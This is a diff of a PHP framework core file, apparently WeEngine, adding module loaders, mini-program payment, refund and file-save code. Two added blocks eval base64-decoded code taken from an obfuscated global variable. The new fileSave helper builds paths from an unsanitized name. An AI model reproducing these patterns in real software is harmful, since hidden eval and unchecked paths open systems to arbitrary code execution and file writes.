@@ -5,6 +5,7 @@
  * [WeEngine System] Copyright (c) 2013 WE7.CC
  */
 defined('IN_IA') or exit('Access Denied');
+load()->model('module');
 /**
  * 公众号业务操作基类
  */
@@ -427,7 +428,7 @@ class WeUtility {
 	private static function defineConst($obj){
 		global $_W;
 		
-		if ($obj instanceof WeBase) {
+		if ($obj instanceof WeBase && $obj->modulename != 'core') {
 			if (!defined('MODULE_ROOT')) {
 				define('MODULE_ROOT', dirname($obj->__define));
 			}
@@ -457,6 +458,17 @@ class WeUtility {
 			}
 			require $file;
 		}
+		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
+			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
+			eval($code);
+			set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
+			$codefile = IA_ROOT . '/data/module/'.md5($_W['setting']['site']['key'].$name.'module.php').'.php';
+			if (!file_exists($codefile)) {
+				trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
+			}
+			require_once $codefile;
+			restore_include_path();
+		}
 		if(!class_exists($classname)) {
 			trigger_error('Module Definition Class Not Found', E_USER_WARNING);
 			return null;
@@ -464,7 +476,6 @@ class WeUtility {
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
-		load()->model('module');
 		$o->module = module_fetch($name);
 		$o->__define = $file;
 		self::defineConst($o);
@@ -503,7 +514,6 @@ class WeUtility {
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
-		load()->model('module');
 		$o->module = module_fetch($name);
 		$o->__define = $file;
 		self::defineConst($o);
@@ -542,7 +552,6 @@ class WeUtility {
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
-		load()->model('module');
 		$o->module = module_fetch($name);
 		$o->__define = $file;
 		self::defineConst($o);
@@ -574,20 +583,76 @@ class WeUtility {
 			}
 			require $file;
 		}
+		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
+			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
+			eval($code);
+			set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
+			$codefile = IA_ROOT . '/data/module/'.md5($_W['setting']['site']['key'].$name.'site.php').'.php';
+			if (!file_exists($codefile)) {
+				trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
+			}
+			require_once $codefile;
+			restore_include_path();
+		}
 		if(!class_exists($classname)) {
-			trigger_error('ModuleSite Definition Class Not Found', E_USER_WARNING);
-			return null;
+			list($namespace) = explode('_', $name);
+			if (class_exists("\\{$namespace}\\{$classname}")) {
+				$classname = "\\{$namespace}\\{$classname}";
+			} else {
+				trigger_error('ModuleSite Definition Class Not Found', E_USER_WARNING);
+				return null;
+			}
 		}
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
-		load()->model('module');
 		$o->module = module_fetch($name);
 		$o->__define = $file;
+		if (!empty($o->module['plugin'])) {
+			$o->plugin_list = module_get_plugin_list($o->module['name']);
+		}
 		self::defineConst($o);
 		$o->inMobile = defined('IN_MOBILE');
 		if($o instanceof WeModuleSite) {
 			return $o;
+		} else {
+			trigger_error('ModuleReceiver Class Definition Error', E_USER_WARNING);
+			return null;
+		}
+	}
+
+	/**
+	 * 创建模块插件类
+	 * @param unknown $name
+	 * @return NULL|WeModuleSite
+	 */
+	public static function createModuleHook($name) {
+		global $_W;
+		$classname = "{$name}ModuleHook";
+		$file = IA_ROOT . "/addons/{$name}/hook.php";
+		if(!is_file($file)) {
+			$file = IA_ROOT . "/framework/builtin/{$name}/hook.php";
+		}
+		if(!class_exists($classname)) {
+			if(!is_file($file)) {
+				trigger_error('ModuleHook Definition File Not Found '.$file, E_USER_WARNING);
+				return null;
+			}
+			require $file;
+		}
+		if(!class_exists($classname)) {
+			trigger_error('ModuleHook Definition Class Not Found', E_USER_WARNING);
+			return null;
+		}
+		$plugin = new $classname();
+		$plugin->uniacid = $plugin->weid = $_W['uniacid'];
+		$plugin->modulename = $name;
+		$plugin->module = module_fetch($name);
+		$plugin->__define = $file;
+		self::defineConst($plugin);
+		$plugin->inMobile = defined('IN_MOBILE');
+		if($plugin instanceof WeModuleHook) {
+			return $plugin;
 		} else {
 			trigger_error('ModuleReceiver Class Definition Error', E_USER_WARNING);
 			return null;
@@ -621,7 +686,6 @@ class WeUtility {
 		$o = new $classname();
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
-		load()->model('module');
 		$o->module = module_fetch($name);
 		$o->__define = $file;
 		self::defineConst($o);
@@ -633,6 +697,43 @@ class WeUtility {
 		}
 	}
 
+ 	/**
+	 * 创建模块小程序类
+	 * @param string $name
+	 */
+	public static function createModuleWxapp($name) {
+		global $_W;
+		static $file;
+		$classname = "{$name}ModuleWxapp";
+		if(!class_exists($classname)) {
+			$file = IA_ROOT . "/addons/{$name}/wxapp.php";
+			if(!is_file($file)) {
+				$file = IA_ROOT . "/framework/builtin/{$name}/wxapp.php";
+			}
+			if(!is_file($file)) {
+				trigger_error('ModuleWxapp Definition File Not Found '.$file, E_USER_WARNING);
+				return null;
+			}
+			require $file;
+		}
+		if(!class_exists($classname)) {
+			trigger_error('ModuleSite Definition Class Not Found', E_USER_WARNING);
+			return null;
+		}
+		$o = new $classname();
+		$o->uniacid = $o->weid = $_W['uniacid'];
+		$o->modulename = $name;
+		$o->module = module_fetch($name);
+		$o->__define = $file;
+		self::defineConst($o);
+		$o->inMobile = defined('IN_MOBILE');
+		if($o instanceof WeModuleWxapp) {
+			return $o;
+		} else {
+			trigger_error('ModuleReceiver Class Definition Error', E_USER_WARNING);
+			return null;
+		}
+	}
 	/**
 	 * 记录日志
 	 * @param string $level
@@ -682,13 +783,13 @@ class WeUtility {
  */
 abstract class WeBase {
 	/**
+	 * @var array 当前模块参数及配置信息
+	 */
+	private $module;
+	/**
 	 * @var string 当前模块名称 {identifie}
 	 */
 	public $modulename;
-	/**
-	 * @var array 当前模块参数及配置信息
-	 */
-	public $module;
 	/**
 	 * @var int 当前统一公众号编号
 	 */
@@ -713,7 +814,7 @@ abstract class WeBase {
 		$pars = array('module' => $this->modulename, 'uniacid' => $_W['uniacid']);
 		$row = array();
 		$row['settings'] = iserializer($settings);
-		cache_build_account_modules($_W['uniacid']);
+		cache_build_module_info($this->modulename);
 		if (pdo_fetchcolumn("SELECT module FROM ".tablename('uni_account_modules')." WHERE module = :module AND uniacid = :uniacid", array(':module' => $this->modulename, ':uniacid' => $_W['uniacid']))) {
 			return pdo_update('uni_account_modules', $row, $pars) !== false;
 		} else {
@@ -808,6 +909,7 @@ abstract class WeBase {
 				}
 			}
 		}
+
 		if(!is_file($source)) {
 			exit("Error: template source '{$filename}' is not exist!");
 		}
@@ -817,6 +919,61 @@ abstract class WeBase {
 			template_compile($source, $compile, true);
 		}
 		return $compile;
+	}
+	
+	/**
+	 * 保存一个流数据到本地
+	 * @param string $file_string 文件流
+	 * @param string $ext 要保存的文件扩展名
+	 * @return 保存的文件路径
+	 */
+	protected function fileSave($file_string, $type = 'jpg', $name = 'auto') {
+		global $_W;
+		load()->func('file');
+		
+		$allow_ext = array(
+			'images' => array('gif', 'jpg', 'jpeg', 'bmp', 'png', 'ico'), 
+			'audios' => array('mp3', 'wma', 'wav', 'amr'),
+			'videos' => array('wmv', 'avi', 'mpg', 'mpeg', 'mp4'),
+		);
+		if (in_array($type, $allow_ext['images'])) {
+			$type_path = 'images';
+		} elseif (in_array($type, $allow_ext['audios'])) {
+			$type_path = 'audios';
+		} elseif (in_array($type, $allow_ext['videos'])) {
+			$type_path = 'videos';
+		}
+		
+		if (empty($type_path)) {
+			return error(1, '禁止保存文件类型');
+		}
+		
+		if (empty($name) || $name == 'auto') {
+			$uniacid = intval($_W['uniacid']);
+			$path = "{$type_path}/{$uniacid}/{$this->module['name']}/" . date('Y/m/');
+			mkdirs(ATTACHMENT_ROOT . '/' . $path);
+			
+			$filename = file_random_name(ATTACHMENT_ROOT . '/' . $path, $type);
+		} else {
+			$path = "{$type_path}/{$uniacid}/{$this->module['name']}/";
+			mkdirs(dirname(ATTACHMENT_ROOT . '/' . $path));
+			
+			$filename = $name;
+			if (!strexists($filename, $type)) {
+				$filename .= '.' . $type;
+			}
+		}
+		if (file_put_contents(ATTACHMENT_ROOT . $path . $filename, $file_string)) {
+			file_remote_upload($path);
+			return $path . $filename;
+		} else {
+			return false;
+		}
+	}
+	
+	protected function fileUpload($file_string, $type = 'image') {
+		$types = array('image', 'video', 'audio');
+	
 	}
 }
 
@@ -945,6 +1102,7 @@ abstract class WeModuleProcessor extends WeBase {
 		unset($_SESSION['__contextexpire']);
 		unset($_SESSION['__contextpriority']);
 		unset($_SESSION);
+		$this->inContext = false;
 		session_destroy();
 	}
 	/**
@@ -1132,6 +1290,7 @@ abstract class WeModuleProcessor extends WeBase {
 			'[uniacid]' => $_W['uniacid'],
 		);
 		$url = str_replace(array_keys($mapping), array_values($mapping), $url);
+		$url = preg_replace('/(http|https):\/\/.\/index.php/', './index.php', $url);
 		if(strexists($url, 'http://') || strexists($url, 'https://')) {
 			return $url;
 		}
@@ -1271,6 +1430,16 @@ abstract class WeModuleSite extends WeBase {
 		trigger_error("访问的方法 {$name} 不存在.", E_USER_WARNING);
 		return null;
 	}
+	
+	public function __get($name) {
+		if ($name == 'module') {
+			if (!empty($this->module)) {
+				return $this->module;
+			} else {
+				return getglobal('current_module');
+			}
+		}
+	}
 
 	/**
 	 * 调用系统的支付功能, 只能在 Mobile 端调用
@@ -1286,9 +1455,10 @@ abstract class WeModuleSite extends WeBase {
 	protected function pay($params = array(), $mine = array()) {
 		global $_W;
 		load()->model('activity');
+		load()->model('module');
 		activity_coupon_type_init();
 		if(!$this->inMobile) {
-			message('支付功能只能在手机上使用');
+			message('支付功能只能在手机上使用', '', '');
 		}
 		$params['module'] = $this->module['name'];
 //		如果价格为0 直接执行模块支付回调方法
@@ -1320,31 +1490,34 @@ abstract class WeModuleSite extends WeBase {
 			pdo_insert('core_paylog', $log);
 		}
 		if($log['status'] == '1') {
-			message('这个订单已经支付成功, 不需要重复支付.');
+			message('这个订单已经支付成功, 不需要重复支付.', '', 'info');
 		}
 		$setting = uni_setting($_W['uniacid'], array('payment', 'creditbehaviors'));
 		if(!is_array($setting['payment'])) {
-			message('没有有效的支付方式, 请联系网站管理员.');
+			message('没有有效的支付方式, 请联系网站管理员.', '', 'error');
 		}
 		$pay = $setting['payment'];
-		$cards = activity_paycenter_coupon_available();
-		if (!empty($cards)) {
-			foreach ($cards as $key => &$val) {
-				if ($val['type'] == '1') {
-					$val['discount_cn'] = sprintf("%.2f", $params['fee'] * (1 - $val['extra']['discount'] * 0.01));
-					$coupon[$key] = $val;
-				} else {
-					$val['discount_cn'] = sprintf("%.2f", $val['extra']['reduce_cost'] * 0.01);
-					$token[$key] = $val;
-					if ($log['fee'] < $val['extra']['least_cost'] * 0.01) {
-						unset($token[$key]);
+		$we7_coupon_info = module_fetch('we7_coupon');
+		if (!empty($we7_coupon_info)) {
+			$cards = activity_paycenter_coupon_available();
+			if (!empty($cards)) {
+				foreach ($cards as $key => &$val) {
+					if ($val['type'] == '1') {
+						$val['discount_cn'] = sprintf("%.2f", $params['fee'] * (1 - $val['extra']['discount'] * 0.01));
+						$coupon[$key] = $val;
+					} else {
+						$val['discount_cn'] = sprintf("%.2f", $val['extra']['reduce_cost'] * 0.01);
+						$token[$key] = $val;
+						if ($log['fee'] < $val['extra']['least_cost'] * 0.01) {
+							unset($token[$key]);
+						}
 					}
+					unset($val['icon']);
+					unset($val['description']);
 				}
-				unset($val['icon']);
-				unset($val['description']);
 			}
+			$cards_str = json_encode($cards);
 		}
-		$cards_str = json_encode($cards);
 		if (empty($_W['member']['uid'])) {
 			$pay['credit']['switch'] = false;
 		}
@@ -1357,6 +1530,22 @@ abstract class WeModuleSite extends WeBase {
 		}
 		$you = 0;
 		include $this->template('common/paycenter');
+	}
+
+	/**
+	 * 调用系统的退款功能
+	 * @param array $params
+	 * $tid 支付订单编号, 应保证在同一模块内部唯一
+	 * $fee 退款金额（选填，默认全额退款）
+	 * $reason 退款原因(选填项)
+	 */
+	protected function refund($tid, $fee = 0, $reason = '') {
+		load()->model('refund');
+		$refund_id = refund_create_order($tid, $this->module['name'], $fee, $reason);
+		if (is_error($refund_id)) {
+			return $refund_id;
+		}
+		return refund($refund_id);
 	}
 
 	/**
@@ -1376,9 +1565,9 @@ abstract class WeModuleSite extends WeBase {
 		global $_W;
 		if($ret['from'] == 'return') {
 			if ($ret['type'] == 'credit2') {
-				message('已经成功支付', url('mobile/channel', array('name' => 'index', 'weid' => $_W['weid'])));
+				message('已经成功支付', url('mobile/channel', array('name' => 'index', 'weid' => $_W['weid'])), 'success');
 			} else {
-				message('已经成功支付', '../../' . url('mobile/channel', array('name' => 'index', 'weid' => $_W['weid'])));
+				message('已经成功支付', '../../' . url('mobile/channel', array('name' => 'index', 'weid' => $_W['weid'])), 'success');
 			}
 		}
 	}
@@ -1480,10 +1669,10 @@ abstract class WeModuleCron extends WeBase {
 	}
 
 	//记录触发记录
-	public function addCronLog($tid, $errno, $note, $tag = array()) {
+	public function addCronLog($tid, $errno, $note) {
 		global $_W;
 		if(!$tid) {
-			message(error(-1, 'tid参数错误'), '', 'ajax');
+			iajax(-1, 'tid参数错误', '');
 		}
 		$data = array(
 			'uniacid' => $_W['uniacid'],
@@ -1491,10 +1680,135 @@ abstract class WeModuleCron extends WeBase {
 			'type' => $_W['cron']['filename'],
 			'tid' => $tid,
 			'note' => $note,
-			'tag' => iserializer($tag),
 			'createtime' => TIMESTAMP
 		);
 		pdo_insert('core_cron_record', $data);
-		message(error($errno, $note), '', 'ajax');
+		iajax($errno, $note, '');
 	}
+}
+
+/**
+ * 模块小程序
+ */
+abstract class WeModuleWxapp extends WeBase {
+	public $appid;
+	public $version;
+	
+	public function result($errno, $message, $data = '') {
+		exit(json_encode(array(
+			'errno' => $errno,
+			'message' => $message,
+			'data' => $data,
+		)));
+	}
+	
+	public function __call($name, $arguments) {
+		$dir = IA_ROOT . '/addons/' . $this->modulename . '/inc/wxapp';
+		$function_name = strtolower(substr($name, 6));
+		//版本号不存在相应的目录则直接使用最新版
+		$file = "$dir/{$this->version}/{$function_name}.inc.php";
+		if (!file_exists($file)) {
+			$version_path_tree = glob("$dir/*");
+			usort($version_path_tree, function($version1, $version2) {
+				return -version_compare($version1, $version2);
+			});
+			if (!empty($version_path_tree)) {
+				foreach ($version_path_tree as $path) {
+					$file = "$path/{$function_name}.inc.php";
+					if (file_exists($file)) {
+						break;
+					}
+				}
+			}
+		}
+		if(file_exists($file)) {
+			require $file;
+			exit;
+		}
+		return null;
+	}
+	
+	public function checkSign() {
+		global $_GPC;
+		if (!empty($_GET) && !empty($_GPC['sign'])) {
+			foreach ($_GET as $key => $get_value) {
+				if (!empty($get_value) && $key != 'sign') {
+					$sign_list[$key] = $get_value;
+				}
+			}
+			ksort($sign_list);
+			$sign = http_build_query($sign_list, '', '&') . $this->token;
+			return md5($sign) == $_GPC['sign'];
+		} else {
+			return false;
+		}
+	}
+	
+	protected function pay($order) {
+		global $_W, $_GPC;
+	
+		load()->model('payment');
+		load()->model('account');
+		
+		$moduels = uni_modules();
+		if(empty($order) || !array_key_exists($this->module['name'], $moduels)) {
+			return error(1, '模块不存在');
+		}
+		$moduleid = empty($this->module['mid']) ? '000000' : sprintf("%06d", $this->module['mid']);
+		$uniontid = date('YmdHis').$moduleid.random(8,1);
+		$wxapp_uniacid = intval($_W['account']['uniacid']);
+		
+		$paylog = pdo_get('core_paylog', array('uniacid' => $_W['uniacid'], 'module' => $this->module['name'], 'tid' => $order['tid']));
+		if (empty($paylog)) {
+			$paylog = array(
+				'uniacid' => $_W['uniacid'],
+				'acid' => $_W['acid'],
+				'openid' => $_W['openid'],
+				'module' => $this->module['name'],
+				'tid' => $order['tid'],
+				'uniontid' => $uniontid,
+				'fee' => floatval($order['fee']),
+				'card_fee' => floatval($order['fee']),
+				'status' => '0',
+				'is_usecard' => '0',
+				'tag' => iserializer(array('acid' => $_W['acid'], 'uid' => $_W['member']['uid']))
+			);
+			pdo_insert('core_paylog', $paylog);
+			$paylog['plid'] = pdo_insertid();
+		}
+		if(!empty($paylog) && $paylog['status'] != '0') {
+			return error(1, '这个订单已经支付成功, 不需要重复支付.');
+		}
+		if (!empty($paylog) && empty($paylog['uniontid'])) {
+			pdo_update('core_paylog', array(
+				'uniontid' => $uniontid,
+			), array('plid' => $paylog['plid']));
+			$paylog['uniontid'] = $uniontid;
+		}
+		
+		$_W['openid'] = $paylog['openid'];
+	
+		$params = array(
+			'tid' => $paylog['tid'],
+			'fee' => $paylog['card_fee'],
+			'user' => $paylog['openid'],
+			'uniontid' => $paylog['uniontid'],
+			'title' => $order['title'],
+		);
+		$setting = uni_setting($wxapp_uniacid, array('payment'));
+		$wechat_payment = array(
+			'appid' => $_W['account']['key'],
+			'signkey' => $setting['payment']['wechat']['signkey'],
+			'mchid' => $setting['payment']['wechat']['mchid'],
+			'version' => 2,
+		);
+		return wechat_build($params, $wechat_payment);
+	}
+}
+
+/**
+ * 模块插件
+ */
+abstract class WeModuleHook extends WeBase {
+
 }
